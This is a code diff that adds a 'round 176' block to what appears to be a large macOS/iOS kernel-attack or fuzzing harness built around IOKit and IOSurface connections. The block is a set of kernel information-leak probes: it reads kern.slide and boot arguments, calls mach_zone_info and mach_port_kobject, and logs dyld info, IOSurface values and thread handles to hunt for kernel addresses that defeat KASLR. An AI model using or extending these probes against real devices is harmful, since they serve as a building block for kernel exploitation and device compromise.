@@ -40,6 +40,7 @@
 #include <pthread.h>
 #include <dispatch/dispatch.h>
 #include <mach/mach.h>
+#include <mach_debug/mach_debug.h>
 #include <mach/mach_time.h>
 #include <CoreFoundation/CoreFoundation.h>
 #include <VideoToolbox/VideoToolbox.h>
@@ -59,6 +60,29 @@
 
 extern int csops(pid_t pid, unsigned int ops, void *useraddr, size_t usersize);
 extern int proc_pidinfo(int pid, int flavor, uint64_t arg, void *buffer, int buffersize);
+#ifndef PROC_PIDTASKINFO
+#define PROC_PIDTASKINFO 4
+struct proc_taskinfo {
+    uint64_t pti_virtual_size;
+    uint64_t pti_resident_size;
+    uint64_t pti_total_user;
+    uint64_t pti_total_system;
+    uint64_t pti_threads_user;
+    uint64_t pti_threads_system;
+    int32_t  pti_policy;
+    int32_t  pti_faults;
+    int32_t  pti_pageins;
+    int32_t  pti_cow_faults;
+    int32_t  pti_messages_sent;
+    int32_t  pti_messages_received;
+    int32_t  pti_syscalls_mach;
+    int32_t  pti_syscalls_unix;
+    int32_t  pti_csw;
+    int32_t  pti_threadnum;
+    int32_t  pti_numrunning;
+    int32_t  pti_priority;
+};
+#endif
 
 #ifndef kIOMasterPortDefault
 #define kIOMasterPortDefault ((mach_port_t)0)
@@ -20506,6 +20530,141 @@ new_modes:
                     }
                     IOObjectRelease(jpeg_svc);
                 }
+
+            } else if (rounds == 176) {
+                /* ---- r=176: Kernel info leak via userspace APIs ---- */
+                rlog("=== r=176: Kernel info leak probes ===\n");
+
+                /* 1. sysctlbyname kern.slide */
+                {
+                    uint64_t slide_val = 0;
+                    size_t slide_sz = sizeof(slide_val);
+                    int sret = sysctlbyname("kern.slide", &slide_val, &slide_sz, NULL, 0);
+                    rlog("  sysctlbyname(kern.slide): ret=%d val=0x%llx sz=%zu errno=%d\n",
+                         sret, (unsigned long long)slide_val, slide_sz, errno);
+                }
+                /* 2. sysctlbyname kern.bootargs */
+                {
+                    char bootargs[512] = {0};
+                    size_t ba_sz = sizeof(bootargs);
+                    int sret = sysctlbyname("kern.bootargs", bootargs, &ba_sz, NULL, 0);
+                    rlog("  sysctlbyname(kern.bootargs): ret=%d val='%s' errno=%d\n",
+                         sret, bootargs, errno);
+                }
+                /* 3. host_zone_info — may leak zone metadata addresses */
+                {
+                    mach_zone_name_t *names = NULL;
+                    mach_msg_type_number_t namesCnt = 0;
+                    mach_zone_info_t *info = NULL;
+                    mach_msg_type_number_t infoCnt = 0;
+                    kern_return_t kr = mach_zone_info(mach_host_self(),
+                                                      &names, &namesCnt,
+                                                      &info, &infoCnt);
+                    rlog("  mach_zone_info: kr=0x%x namesCnt=%u infoCnt=%u\n",
+                         kr, namesCnt, infoCnt);
+                    if (kr == KERN_SUCCESS && namesCnt > 0) {
+                        for (unsigned z = 0; z < namesCnt && z < 10; z++) {
+                            rlog("    zone[%u]: '%s' cur=%llu peak=%llu cur_sz=%llu\n",
+                                 z, names[z].mzn_name,
+                                 (unsigned long long)info[z].mzi_count,
+                                 (unsigned long long)info[z].mzi_peak,
+                                 (unsigned long long)info[z].mzi_cur_size);
+                        }
+                    }
+                    if (names) vm_deallocate(mach_task_self(), (vm_address_t)names,
+                                              namesCnt * sizeof(mach_zone_name_t));
+                    if (info) vm_deallocate(mach_task_self(), (vm_address_t)info,
+                                             infoCnt * sizeof(mach_zone_info_t));
+                }
+                /* 4. mach_port_kobject on our IOSurface connection */
+                {
+                    natural_t kotype = 0;
+                    mach_vm_address_t kaddr = 0;
+                    kern_return_t kr = mach_port_kobject(mach_task_self(),
+                                                         conn17, &kotype, (unsigned *)&kaddr);
+                    rlog("  mach_port_kobject(conn17): kr=0x%x type=%u addr=0x%llx\n",
+                         kr, kotype, (unsigned long long)kaddr);
+                }
+                /* 5. mach_port_kobject on mach_host_self() */
+                {
+                    natural_t kotype = 0;
+                    mach_vm_address_t kaddr = 0;
+                    kern_return_t kr = mach_port_kobject(mach_task_self(),
+                                                         mach_host_self(), &kotype, (unsigned *)&kaddr);
+                    rlog("  mach_port_kobject(host): kr=0x%x type=%u addr=0x%llx\n",
+                         kr, kotype, (unsigned long long)kaddr);
+                }
+                /* 6. task_info TASK_DYLD_INFO */
+                {
+                    struct task_dyld_info dyld_info;
+                    mach_msg_type_number_t cnt = TASK_DYLD_INFO_COUNT;
+                    kern_return_t kr = task_info(mach_task_self(), TASK_DYLD_INFO,
+                                                 (task_info_t)&dyld_info, &cnt);
+                    rlog("  task_info(DYLD): kr=0x%x all_image_info_addr=0x%llx sz=%llu\n",
+                         kr,
+                         (unsigned long long)dyld_info.all_image_info_addr,
+                         (unsigned long long)dyld_info.all_image_info_size);
+                }
+                /* 7. IOSurface properties after compositor use */
+                {
+                    NSDictionary *sprops = @{
+                        @"IOSurfaceWidth": @(64),
+                        @"IOSurfaceHeight": @(64),
+                        @"IOSurfaceBytesPerElement": @(4),
+                        @"IOSurfacePixelFormat": @(0x42475241) /* BGRA */
+                    };
+                    IOSurfaceRef leak_surf = IOSurfaceCreate((__bridge CFDictionaryRef)sprops);
+                    if (leak_surf) {
+                        CFDictionaryRef all_vals = IOSurfaceCopyAllValues(leak_surf);
+                        if (all_vals) {
+                            CFIndex cnt = CFDictionaryGetCount(all_vals);
+                            rlog("  IOSurfaceCopyAllValues: %ld keys\n", (long)cnt);
+                            const void **keys = calloc(cnt, sizeof(void *));
+                            const void **vals = calloc(cnt, sizeof(void *));
+                            if (keys && vals) {
+                                CFDictionaryGetKeysAndValues(all_vals, keys, vals);
+                                for (CFIndex i = 0; i < cnt; i++) {
+                                    char kbuf[128] = {0};
+                                    CFStringGetCString(keys[i], kbuf, sizeof(kbuf),
+                                                       kCFStringEncodingUTF8);
+                                    if (CFGetTypeID(vals[i]) == CFNumberGetTypeID()) {
+                                        uint64_t nv = 0;
+                                        CFNumberGetValue(vals[i], kCFNumberSInt64Type, &nv);
+                                        if (nv > 0x1000000) {
+                                            rlog("    prop '%s' = 0x%llx\n", kbuf,
+                                                 (unsigned long long)nv);
+                                        }
+                                    }
+                                }
+                            }
+                            free(keys);
+                            free(vals);
+                            CFRelease(all_vals);
+                        }
+                        CFRelease(leak_surf);
+                    }
+                }
+                /* 8. proc_pidinfo */
+                {
+                    struct proc_taskinfo pti;
+                    int ret = proc_pidinfo(getpid(), PROC_PIDTASKINFO, 0,
+                                           &pti, sizeof(pti));
+                    rlog("  proc_pidinfo(TASKINFO): ret=%d virtual_size=0x%llx\n",
+                         ret, (unsigned long long)pti.pti_virtual_size);
+                }
+                /* 9. thread_identifier_info — might leak thread kernel addr */
+                {
+                    thread_identifier_info_data_t tii;
+                    mach_msg_type_number_t cnt = THREAD_IDENTIFIER_INFO_COUNT;
+                    kern_return_t kr = thread_info(mach_thread_self(),
+                                                    THREAD_IDENTIFIER_INFO,
+                                                    (thread_info_t)&tii, &cnt);
+                    rlog("  thread_info(IDENT): kr=0x%x thread_id=0x%llx handle=0x%llx\n",
+                         kr,
+                         (unsigned long long)tii.thread_id,
+                         (unsigned long long)tii.thread_handle);
+                }
+                rlog("=== r=176 complete ===\n");
             }
 
             IOServiceClose(conn17);
